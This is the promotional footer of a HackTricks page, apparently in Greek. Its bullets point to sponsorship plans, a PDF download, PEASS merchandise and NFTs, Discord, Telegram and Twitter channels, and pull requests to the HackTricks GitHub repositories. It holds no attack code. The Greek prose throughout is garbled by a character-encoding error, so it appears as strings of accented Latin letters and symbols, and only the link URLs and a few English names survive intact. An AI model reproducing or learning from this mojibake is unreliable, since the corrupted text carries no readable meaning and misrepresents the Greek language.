* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î·Î½ [**ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
